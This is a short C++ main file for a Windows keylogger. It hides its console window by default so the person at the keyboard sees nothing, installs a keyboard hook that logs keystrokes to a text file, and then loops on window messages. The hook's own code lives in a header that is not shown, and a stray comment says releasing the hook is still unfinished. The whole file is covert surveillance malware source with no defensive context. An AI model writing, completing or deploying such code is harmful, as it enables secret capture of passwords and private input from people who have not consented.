#define WIN32_LEAN_AND_MEAN

#include "KeyboardHook.h"
#include <windows.h>

//Falta tratar do release hook

int main(){

	//This variable defines the logFile name
	std::string log = "logFile.txt";

	//This variable defines if the terminal is displayed while the keylogger is running
	bool display_terminal = false;

	if(!display_terminal){
		ShowWindow( GetConsoleWindow(), SW_HIDE );
	}

    SetHook("kappa.txt");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

}

